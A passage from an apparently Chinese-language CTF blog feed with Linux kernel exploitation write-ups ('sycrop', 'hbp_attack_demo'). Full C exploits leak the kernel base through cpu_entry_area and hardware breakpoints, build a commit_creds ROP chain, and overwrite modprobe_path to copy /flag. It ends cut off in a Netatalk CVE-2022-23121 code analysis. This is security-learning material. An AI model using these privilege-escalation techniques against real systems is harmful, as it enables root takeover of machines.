{</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cea;</span><br><span class="line"></span><br><span class="line">again:</span><br><span class="line">cea = get_random_u32_below(max_cea);</span><br><span class="line"></span><br><span class="line">for_each_possible_cpu(j) {</span><br><span class="line"><span class="keyword">if</span> (cea_offset(j) == cea)</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i == j)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">per_cpu(_cea_offset, i) = cea;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is called from entry code, so must be noinstr */</span></span><br><span class="line">noinstr <span class="keyword">struct</span> cpu_entry_area *<span class="title function_">get_cpu_entry_area</span><span class="params">(<span class="type">int</span> cpu)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> va = CPU_ENTRY_AREA_PER_CPU + cea_offset(cpu) * CPU_ENTRY_AREA_SIZE;</span><br><span class="line">BUILD_BUG_ON(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> cpu_entry_area) % PAGE_SIZE != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> cpu_entry_area *) va;</span><br><span class="line">}</span><br><span class="line">EXPORT_SYMBOL(get_cpu_entry_area);</span><br></pre></td></tr></tbody></table></figure><h2 id="sycrop"><a href="#sycrop" class="headerlink" title="sycrop"></a>sycrop</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>给了一次内核任意地址的四字节读和一次栈迁移的机会.<br>从cpu_entry_area读泄露kbase,fork出子进程触发一次硬件断点,cpu_entry_area异常处理栈中留下pt_regs结构.再栈迁移到中的pt_regs结构即可完成在通用寄存器中布置的ROP链.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405090020538.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405090019960.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405082322112.png"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DR_OFFSET(num) ((void *)(&amp;((struct user *)0)-&gt;u_debugreg[num]))</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_hbp</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">void</span> *addr)</span> {</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set DR0: HBP address</span></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(<span class="number">0</span>), addr) != <span class="number">0</span>) {</span><br><span class="line">        die(<span class="string">"create hbp ptrace dr0: %m"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set DR7: bit 0 enables DR0 breakpoint. Bit 8 ensures the processor stops</span></span><br><span class="line"><span class="comment">     * on the instruction which causes the exception. bits 16,17 means we stop</span></span><br><span class="line"><span class="comment">     * on data read or write. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> dr_7 = (<span class="number">1</span> &lt;&lt; <span class="number">0</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">8</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>);</span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(<span class="number">7</span>), (<span class="type">void</span> *)dr_7) != <span class="number">0</span>) {</span><br><span class="line">        die(<span class="string">"create hbp ptrace dr7: %m"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">child_func</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    raise(SIGSTOP);</span><br><span class="line">    logd(<span class="string">"Child Weakup"</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">".intel_syntax noprefix;"</span></span><br><span class="line">        <span class="string">"mov r15,pop_rdi;"</span></span><br><span class="line">        <span class="string">"mov r14,init_cred;"</span></span><br><span class="line">        <span class="string">"mov r13,commit_creds;"</span></span><br><span class="line">        <span class="string">"mov r12,swapgs_ret2user;"</span></span><br><span class="line">        <span class="string">"mov rbp,   0;"</span></span><br><span class="line">        <span class="string">"mov rbx,   0;"</span></span><br><span class="line">        <span class="string">"mov r11,   user_rip;"</span></span><br><span class="line">        <span class="string">"mov r10,   user_cs;"</span></span><br><span class="line">        <span class="string">"mov r9,    user_rflags;"</span>   </span><br><span class="line">        <span class="string">"mov r8,    user_sp;"</span></span><br><span class="line">        <span class="string">"mov rax,   user_ss;"</span></span><br><span class="line">        <span class="string">"mov rcx,   0xdeadbeef;"</span></span><br><span class="line">        <span class="string">"mov rdx,   0xdeadbeef;"</span></span><br><span class="line">        <span class="string">"mov rsi,   pbuf;"</span></span><br><span class="line">        <span class="string">"mov rdi,   [rsi];"</span></span><br><span class="line">        <span class="string">".att_syntax;"</span></span><br><span class="line">    );</span><br><span class="line">    logd(<span class="string">"Child Exit"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">size_t</span> pbuf = &amp;buf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds;</span><br><span class="line"><span class="type">size_t</span> prepare_creds;</span><br><span class="line"><span class="type">size_t</span> init_cred;</span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> swapgs_ret2user;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((dev_fd = open(<span class="string">"/dev/seven"</span>,O_RDWR))&lt;<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        err_exit(<span class="string">"open device"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    kernel_base = (<span class="type">uint32_t</span>)(ioctl(dev_fd,<span class="number">0x5555</span>,<span class="number">0xfffffe0000000004</span>))+</span><br><span class="line">                                            +<span class="number">0xffffffff00000000</span><span class="number">-0x1008e00</span>ULL;</span><br><span class="line">    HEX(<span class="string">"kernel_base"</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    commit_creds = kernel_base+<span class="number">0x000bb5b0</span>;</span><br><span class="line">    prepare_creds = kernel_base+<span class="number">0x000bb9a0</span>;</span><br><span class="line">    init_cred = kernel_base+<span class="number">0x01a4cbf8</span>;</span><br><span class="line">    pop_rdi = kernel_base+<span class="number">0x2c9d</span>;</span><br><span class="line">    swapgs_ret2user = kernel_base+<span class="number">0x01000ed0</span> + <span class="number">49</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="keyword">if</span>((pid = fork())==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        user_sp += <span class="number">8</span>;</span><br><span class="line">        child_func();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待子进程暂停</span></span><br><span class="line">    waitpid(pid,&amp;status,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    create_hbp(pid,buf);</span><br><span class="line">    ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">           </span><br><span class="line">    <span class="comment">//等待子进程触发断点</span></span><br><span class="line">    waitpid(pid,&amp;status,<span class="number">0</span>);</span><br><span class="line">    ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待子进程退出</span></span><br><span class="line">    waitpid(pid,&amp;status,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd,<span class="number">0x6666</span>,<span class="number">0xfffffe0000010f58</span>);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="hbp-attack-demo"><a href="#hbp-attack-demo" class="headerlink" title="hbp_attack_demo"></a>hbp_attack_demo</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>驱动就是一个无限制的任意写.利用就是之前所说,子进程1不断uname触发断点并查看是否泄露出内核栈,子进程2不断修改内核栈上的pt_regs.获取到内核地址后写modprobe_path读取flag.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405091747322.png"></p><p>在exc_debug函数下断点,查看rdi指向的空间,即为0xA8大小的pt_regs结构.<br>这里注意数据断点是会断在触发断点的那条访存指令的后一条指令,所以此时已经完成了8字节的一次拷贝.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405091453242.png"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">size_t</span>* aligin_buf;</span><br><span class="line"><span class="type">int</span> sync_pipe[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arb_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">ARG</span></span></span><br><span class="line"><span class="class">    {</span></span><br><span class="line">        <span class="type">uint64_t</span> addr_;</span><br><span class="line">        <span class="type">uint64_t</span> val_;</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ARG</span> <span class="title">arg</span> =</span> {.addr_=addr,.val_=val};</span><br><span class="line">    </span><br><span class="line">    ioctl(dev_fd,<span class="number">0</span>,&amp;arg);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">// hexdump(aligin_buf,0x400);</span></span><br><span class="line">    <span class="comment">// HEX("aligin_buf",aligin_buf[51]);</span></span><br><span class="line">    <span class="keyword">if</span>(((aligin_buf[<span class="number">51</span>]&amp;<span class="number">0xfff</span>)==<span class="number">0xb32</span>) &amp;&amp; (aligin_buf[<span class="number">51</span>]&gt;<span class="number">0xffffffff81000000</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="type">size_t</span> canary = aligin_buf[<span class="number">47</span>];</span><br><span class="line">        kernel_base = aligin_buf[<span class="number">51</span>]<span class="number">-0xe0b32</span>;</span><br><span class="line">        logi(<span class="string">"got kernel_base"</span>);</span><br><span class="line">        write(sync_pipe[<span class="number">1</span>],&amp;kernel_base,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_kstack</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    logd(<span class="string">"leak_kstack init"</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    raise(SIGSTOP);</span><br><span class="line"></span><br><span class="line">    logd(<span class="string">"leak_kstack start"</span>);</span><br><span class="line"></span><br><span class="line">    aligin_buf = buf+<span class="number">0xE</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        uname(buf);       </span><br><span class="line">        check(); </span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((dev_fd = open(<span class="string">"/dev/vuln"</span>,O_RDWR))&lt;<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        err_exit(<span class="string">"open device"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid1,pid2;</span><br><span class="line"></span><br><span class="line">    pipe(sync_pipe);</span><br><span class="line">    <span class="keyword">if</span>((pid1 = fork())==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        close(sync_pipe[<span class="number">0</span>]);</span><br><span class="line">        leak_kstack();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    close(sync_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待child1暂停</span></span><br><span class="line">    waitpid(pid1,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    create_hbp(pid1,buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//条件竞争写regs.rcx</span></span><br><span class="line">    <span class="keyword">if</span>((pid2 = fork())==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        bind_core(<span class="number">1</span>);</span><br><span class="line">        logd(<span class="string">"Trigger start"</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        {</span><br><span class="line">            arb_write(<span class="number">0xfffffe0000010fb0</span>,<span class="number">0x400</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_CONT,pid1,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//阻塞,等待子进程获取kernel_base;</span></span><br><span class="line">    read(sync_pipe[<span class="number">0</span>],&amp;kernel_base,<span class="number">8</span>);</span><br><span class="line">    logd(<span class="string">"Parent received kernel_base"</span>);</span><br><span class="line">    HEX(<span class="string">"kernel_base"</span>,kernel_base);</span><br><span class="line">    kill(pid2,SIGKILL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    logd(<span class="string">"modify modprobe_path"</span>);</span><br><span class="line">    <span class="type">size_t</span> modprobe_path = kernel_base+<span class="number">0x01e8b920</span>;</span><br><span class="line">    arb_write(modprobe_path,u64(<span class="string">"/copy\0\0\0"</span>));</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /flag /Pwned\n/bin/chmod 777 /Pwned' &gt; /copy"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /copy"</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /dummy"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /dummy"</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"/dummy"</span>);</span><br><span class="line"></span><br><span class="line">    logi(<span class="string">"Pwned by HanQi..."</span>);</span><br><span class="line">    system(<span class="string">"cat /Pwned"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405091744343.png"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://veritas501.github.io/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">https://veritas501.github.io/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/</a><br><a href="https://blog.csdn.net/qq_61670993/article/details/134980555">https://blog.csdn.net/qq_61670993/article/details/134980555</a><br><a href="https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html">https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CVE </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AliyunCTF2024 Netatalk v3.1.12 越界读写利用</title>
      <link href="/2024/AliyunCTF2024%20Exploit%20Netatalk%20v3.1.12%20by%20CVE-2022-23121/"/>
      <url>/2024/AliyunCTF2024%20Exploit%20Netatalk%20v3.1.12%20by%20CVE-2022-23121/</url>
      
        <content type="html"><![CDATA[<p>House of AppleDouble(x<br>大部分时间用在理解AFP协议以及AD文件格式上了…</p><span id="more"></span><h2 id="CVE-2022-23121"><a href="#CVE-2022-23121" class="headerlink" title="CVE-2022-23121"></a>CVE-2022-23121</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>查看漏洞报告,提取出关键信息 <a href="https://www.zerodayinitiative.com/advisories/ZDI-22-527/">https://www.zerodayinitiative.com/advisories/ZDI-22-527/</a></p><blockquote><p>This vulnerability allows remote attackers to execute arbitrary code on affected installations of Netatalk. Authentication is not required to exploit this vulnerability.<br>The specific flaw exists within the <code>parse_entries</code> function. The issue results from <code>the lack of proper error handling</code> when parsing AppleDouble entries. An attacker can leverage this vulnerability to execute code in the context of root.</p></blockquote><p>来到parse_entries函数,该函数从用户可控的AppleDouble buffer中获取eid,off,len字段,并存入ad的对应条目中.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Read an AppleDouble buffer, returns 0 on success, -1 if an entry was malformatted</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_entries</span><span class="params">(<span class="keyword">struct</span> adouble *ad, <span class="type">char</span> *buf, <span class="type">uint16_t</span> nentries)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span>   eid, len, off;</span><br><span class="line">    <span class="type">int</span>        ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, read in the entry bits */</span></span><br><span class="line">    <span class="keyword">for</span> (; nentries &gt; <span class="number">0</span>; nentries-- ) {</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;eid, buf, <span class="keyword">sizeof</span>( eid ));</span><br><span class="line">        eid = get_eid(ntohl(eid));</span><br><span class="line">        buf += <span class="keyword">sizeof</span>( eid );</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;off, buf, <span class="keyword">sizeof</span>( off ));</span><br><span class="line">        off = ntohl( off );</span><br><span class="line">        buf += <span class="keyword">sizeof</span>( off );</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;len, buf, <span class="keyword">sizeof</span>( len ));</span><br><span class="line">        len = ntohl( len );</span><br><span class="line">        buf += <span class="keyword">sizeof</span>( len );</span><br><span class="line"></span><br><span class="line">        ad-&gt;ad_eid[eid].ade_off = off;</span><br><span class="line">        ad-&gt;ad_eid[eid].ade_len = len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!eid</span><br><span class="line">            || eid &gt; ADEID_MAX</span><br><span class="line">            || off &gt;= <span class="keyword">sizeof</span>(ad-&gt;ad_data)</span><br><span class="line">            || ((eid != ADEID_RFORK) &amp;&amp; (off + len &gt;  <span class="keyword">sizeof</span>(ad-&gt;ad_data))))</span><br><span class="line">        {</span><br><span class="line">            ret = <span class="number">-1</span>;</span><br><span class="line">            LOG(log_warning, logtype_ad, <span class="string">"parse_entries: bogus eid: %u, off: %u, len: %u"</span>,</span><br><span class="line">                (uint)eid, (uint)off, (uint)len);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>看一下对off和len字段的check,</p><ul><li>off要小于AD_DATASZ_MAX(1024).</li><li>除ADEID_RFORK条目外,off+len要小于AD_DATASZ_MAX(1024).</li></ul><p>初步判断这里off+len有个整数溢出可以绕过checker,绕过的效果为将非法的len存入ad的条目中.但查找对ad_getentrylen的引用可以发现,非法的len并不能导致危险操作.</p><p>再回到off字段上,虽然有off &gt;= sizeof(ad-&gt;ad_data)的check,但checker实际有没有用需要看父函数对-1的返回值是怎么处理的.<br>接下来应该跟一下:</p><ol><li>父函数的错误处理.</li><li>off字段在哪里使用?</li></ol><p>对比一下三处调用</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ad_header_read</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> adouble *ad, <span class="type">const</span> <span class="keyword">struct</span> stat *hst)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">    <span class="comment">/* figure out all of the entry offsets and lengths. if we aren't</span></span><br><span class="line"><span class="comment">     * able to read a resource fork entry, bail. */</span></span><br><span class="line">    nentries = len / AD_ENTRY_LEN;</span><br><span class="line">    <span class="keyword">if</span> (parse_entries(ad, buf, nentries) != <span class="number">0</span>) {</span><br><span class="line">        LOG(log_warning, logtype_ad, <span class="string">"ad_header_read(%s): malformed AppleDouble"</span>,</span><br><span class="line">            path ? fullpathname(path) : <span class="string">""</span>);</span><br><span class="line">        errno = EIO;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span 